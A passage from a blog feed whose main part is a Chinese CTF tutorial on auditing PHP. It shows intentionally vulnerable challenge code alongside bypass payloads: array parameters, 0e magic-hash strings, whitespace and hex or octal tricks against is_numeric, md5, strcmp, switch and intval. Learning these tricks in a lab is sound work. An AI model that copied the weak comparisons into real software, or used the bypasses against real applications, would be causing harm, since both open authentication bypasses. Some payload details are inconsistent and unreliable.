sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> artical1 <span class="hljs-keyword">where</span> <span class="hljs-keyword">value</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;helloworld&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>条件：表1 和 表2 的字段数必须相同</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h3><p>下划线通配符 （_）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> str <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%str%&#x27;</span>;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PHP代码审计</title>
      <link href="/posts/5fe44501/"/>
      <url>/posts/5fe44501/</url>
      
        <content type="html"><![CDATA[<h1 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric 函数"></a>is_numeric 函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>)</span>&#123;<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$num</span>;<br>&#125;<br><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) <span class="hljs-keyword">and</span> <span class="hljs-variable">$num</span>!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$num</span>)!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$num</span>)==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>绕过 ： 前面加上 %09 %0a %0b %0c %0d 等空字符</p><p>is_numeric() 函数对于 %00 这类空字符，不管是放在前后都可以判断为非数值，而%20空格字符只能放在数值后，因为查看函数发现改函数对于第一个空格字符会跳过空格字符直接判断后面的内容</p><h1 id="preg-match-函数-–-正则表达式"><a href="#preg-match-函数-–-正则表达式" class="headerlink" title="preg_match 函数 – 正则表达式"></a>preg_match 函数 – 正则表达式</h1><h4 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h4><table><thead><tr><th>元字符</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>0次、1次或多次匹配其前一位</td></tr><tr><td>+</td><td>1次或多次匹配其前的原子</td></tr><tr><td>？</td><td>0次或1次匹配</td></tr><tr><td>|</td><td>匹配两个或者多个选择</td></tr><tr><td>^</td><td>匹配字符串串首</td></tr><tr><td>$</td><td>匹配字符串</td></tr><tr><td>[]</td><td>匹配方括号中任一原子</td></tr><tr><td>[^]</td><td>匹配除方括号中的原子外的任何字符</td></tr><tr><td>{m}</td><td>表示其前原子恰好出现m次</td></tr><tr><td>{m,n}</td><td>表示其前原子 （n&gt;m）</td></tr><tr><td>{m，}</td><td>表示其前原子出现不少于m次</td></tr><tr><td>（）</td><td>整体表示一个原子</td></tr><tr><td>.</td><td>匹配除换行之外的任何一个字符</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>); <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123; <br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?zkaqzkaq/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>); <br>    &#125; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;zkaqzkaq&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>); <br>    &#125; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br>&#125; <br><br></code></pre></td></tr></table></figure><p>注 ： preg_match 函数只能处理字符串，当传入的参数为数组时会返回 false</p><h1 id="md5-sha1-函数"><a href="#md5-sha1-函数" class="headerlink" title="md5 sha1 函数"></a>md5 sha1 函数</h1><ol><li>对于php强比较和弱比较： md5() ,sha1() 函数无法处理数组，如果传入的为数组，两个数组经过加密后都是 NULL ，也就是相等的。</li><li>对于某些特殊的字符串加密后得到的密文以 0e 开头，php 会当作可续计数法来处理，也就是 0 的n 次方，得到的值比较的时候 都相同。</li></ol><p>payload:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">md5：<br> <br><span class="hljs-number">240610708</span>:<span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span><br>QLTHNDT:<span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span><br>QNKCDZO:<span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br>PJNPDWY:<span class="hljs-number">0</span>e2915290528947027745<span class="hljs-number">57631701704</span><br>NWWKITQ:<span class="hljs-number">0</span>e7630820709760383476<span class="hljs-number">57360817689</span><br>NOOPCJF:<span class="hljs-number">0</span>e818888003657176127<span class="hljs-number">862245791911</span><br>MMHUWUV:<span class="hljs-number">0</span>e701732711630150438<span class="hljs-number">129209816536</span><br>MAUXXQC:<span class="hljs-number">0</span>e4784784668484390404<span class="hljs-number">34801845361</span><br> <br>sha1：<br> <br><span class="hljs-number">10932435112</span>: <span class="hljs-number">0</span>e0776691500413317634705586<span class="hljs-number">5026311692244</span><br>aaroZmOk: <span class="hljs-number">0</span>e66507019969427134894567494<span class="hljs-number">305185566735</span><br>aaK1STfY: <span class="hljs-number">0</span>e766585266557562076882711596<span class="hljs-number">24026011393</span><br>aaO8zKZF: <span class="hljs-number">0</span>e89257456677279068558073954<span class="hljs-number">252716165668</span><br>aa3OFF9m: <span class="hljs-number">0</span>e369777862785179849592603940<span class="hljs-number">24281014729</span><br><span class="hljs-number">0</span>e<span class="hljs-number">1290633704</span>: <span class="hljs-number">0</span>e19985187802402577070739524<span class="hljs-number">195726831799</span><br><br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$name</span> != <span class="hljs-variable">$pass</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$name</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;True: flag&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wrong&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul><li><p>使用数组绕过</p><ul><li><code>http://localhost/?name[]=aaa&amp;pass[]=bbb</code></li></ul></li><li><p>使用特殊值绕过</p><ul><li><code>http://localhost/?name=QLTHNDT&amp;pass=QNKCDZO</code></li></ul></li></ul><p>案例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">// include(&#x27;flag.php&#x27;);</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$v1</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;asd&#125;&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><h1 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp 函数"></a>strcmp 函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$str1</span>,<span class="hljs-variable">$str2</span>)<br><span class="hljs-comment">//strcmp 函数是比较两个字符串，如果str1&lt;str2 则返回 &lt; 0 。如果str1&gt;str2 则返回 &gt; 0 。 如果两者相等则返回 0；</span><br></code></pre></td></tr></table></figure><p><strong>strcmp 比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值为0，一般利用这一点进行绕过</strong></p><ul><li>flag.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;lkasjhfdasdhfasiu8dfhawes&#125;&#x27;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;asddddddddddddddddd&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>index.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>],<span class="hljs-variable">$password</span>) == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$flag</span>&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h1 id="switch-函数"><a href="#switch-函数" class="headerlink" title="switch 函数"></a>switch 函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;test.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;paraml&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;paraml&#x27;</span>];<br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$a</span>)&#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-variable">$a</span>&gt;=<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-variable">$a</span>&gt;=<span class="hljs-number">10</span>:<br>            <span class="hljs-keyword">echo</span> FLAG;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">paraml</span>=0<br></code></pre></td></tr></table></figure><p>首先传进去 a &#x3D; 0;</p><ol><li>进入第一个case  : 判断 0&gt;&#x3D;0 结果为true，接着判断 0 &#x3D;&#x3D; true ，结果是false;</li><li>进入第二个case  ：判断 0&gt;&#x3D;10 结果是false，接着判断 0 &#x3D;&#x3D; false 结果是true;</li><li>输出flag;</li></ol><h1 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval 函数"></a>intval 函数</h1><p><em>注：漏洞只存在于某些版本的php中</em></p><p>intval 用于获取变量的整数值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-number">53</span>)  <span class="hljs-comment">// 53</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-number">5.3</span>) <span class="hljs-comment">// 5</span><br></code></pre></td></tr></table></figure><p>函数使用方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-keyword">var</span>,base)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">var 是要转换成 integer 的数量值，base只转化所用的进制</span><br><span class="hljs-comment">如果base是0，通过检测 var 的格式来决定所使用的进制</span><br><span class="hljs-comment">0x -&gt; 16进制</span><br><span class="hljs-comment">0 -&gt; 8进制</span><br><span class="hljs-comment">否则使用10 进制</span><br><span class="hljs-comment">*/</span><br><br></code></pre></td></tr></table></figure><p>成功时返回 var 的 integer 值，失败时返回 0； </p><p>空的 array 返回0 ，非空的 array 返回 0；</p><p>如果是一个弱比较 a &#x3D;&#x3D; b  ，我们传入 a[]&#x3D;1和b[]&#x3D;2</p><p>某些版本的php对科学计数法中的e不敏感</p><h4 id="案例1："><a href="#案例1：" class="headerlink" title="案例1："></a>案例1：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;test.php&#x27;</span>);<br><br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$s</span>) &lt; <span class="hljs-number">666</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$s</span>+<span class="hljs-number">1</span>) &gt; <span class="hljs-number">667</span>)&#123;<br>    <span class="hljs-keyword">echo</span> FLAG;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?a</span> = <span class="hljs-number">1e10</span><br></code></pre></td></tr></table></figure><h4 id="案例2："><a href="#案例2：" class="headerlink" title="案例2："></a>案例2：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;6666&quot;</span>)&#123;  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">6666</span>)&#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解析： 函数格式 <code>intval($value,$base)</code></p><p>当 <code>$base</code> 的值为0 时，函数会检测 $value 的格式来决定使用的进制</p><p>payload：</p><p><code>/?num=0x1a0a</code></p><h1 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos 函数"></a>strpos 函数</h1><p>strpos 函数查找字符串在另一个字符串中出现的位置并返回</p><h4 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;6666&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;   <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">6666</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解析： preg_match 函数过滤了26的英文字母（包括大小写）</p><p>所以通过16进制来获取flag的方法是不可取的，可以考虑使用8进制来绕过，6666的八进制为 15012 在前面加上0 表示 8进制</p><p>所以传入 <code>015012</code></p><p>会发现还是不行，这是因为 第三条 if函数 控制了第一个传入的字符不能为 0 所以被ban掉了</p><p>可以尝试在传参前面加上一个空格</p><p>payload:</p><p>&#96;&#96;&#96;num&#x3D; 05012&#96;&#96;</p><h1 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array 函数"></a>in_array 函数</h1><p>考点： 函数的作用是检查数组中是否存在某个值，当函数中</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>STL库（一）--Vector</title>
      <link href="/posts/afe38b32/"/>
      <url>/posts/afe38b32/</url>
      
